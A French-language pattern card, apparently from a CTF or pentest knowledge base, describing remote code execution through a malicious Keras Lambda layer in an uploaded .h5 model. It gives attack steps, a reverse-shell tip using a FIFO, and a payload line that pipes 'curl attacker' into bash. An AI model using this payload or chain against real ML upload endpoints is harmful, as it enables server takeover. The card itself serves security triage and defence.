---
doc_kind: pattern
title: "RCE via couche Lambda Keras malveillante dans un modele uploade"
category: web
slug: fullhouse-tensorflow-lambda-rce
created: 2026-10-29
status: active
tags:
  - ml-deserialization
  - keras-lambda-rce
  - model-upload
  - fifo-shell
  - tensorflow
chain_summary: "Une couche tf.keras.layers.Lambda dans un fichier modele .h5 execute du code Python arbitraire a l'import/chargement; tout endpoint d'upload de modele ML qui charge le modele sans sandboxing est exploitable en RCE."
---
# RCE via couche Lambda Keras malveillante dans un modele uploade

## Chain Summary

- One-line chain: Une couche tf.keras.layers.Lambda dans un fichier modele .h5 execute du code Python arbitraire a l'import/chargement; tout endpoint d'upload de modele ML qui charge le modele sans sandboxing est exploitable en RCE.
- Typical target shape: Application acceptant l'upload d'un modele Keras/TensorFlow (.h5/.keras) et le chargeant cote serveur (tf.keras.models.load_model) sans sandboxing.

## Preconditions

- Application acceptant l'upload d'un modele Keras/TensorFlow (.h5/.keras) et le chargeant cote serveur (tf.keras.models.load_model) sans sandboxing.

## Cheap Probes

- Identifier un endpoint d'upload de modele ML et verifier s'il charge directement le fichier sans validation de son contenu/structure.

## Telltale Evidence

- Un modele avec une couche Lambda malveillante, une fois uploade, declenche l'execution de son code au chargement cote serveur.

## Escalation Order

1. Construire un modele Sequential minimal avec une couche Lambda appelant os.system/subprocess.
2. Sauvegarder le modele au format .h5.
3. L'uploader via l'endpoint cible.
4. Declencher le chargement/l'inference du modele pour executer le payload.
5. Pour un reverse shell qui bloque sans lecteur sur un pipe simple, utiliser une FIFO lecture-ecriture.

## Common Mistakes

- Charger un modele ML tiers/uploade sans sandboxing (processus isole, pas de bibliotheque permettant l'execution de code arbitraire comme Lambda).

## Payload Shapes

```text
tf.keras.layers.Lambda(lambda x: os.system('curl attacker|bash') or x)
```

## Related Writeups

- fullhouse-tensorflow-lambda-rce

## Skill Impact

- Related skill: web-triage (RCE/ML): ajouter l'upload de modele Keras/TensorFlow avec couche Lambda comme sous-cas de RCE via deserialisation ML.
- Rule to add or update: (backlog only for now; promote if this pattern repeats)
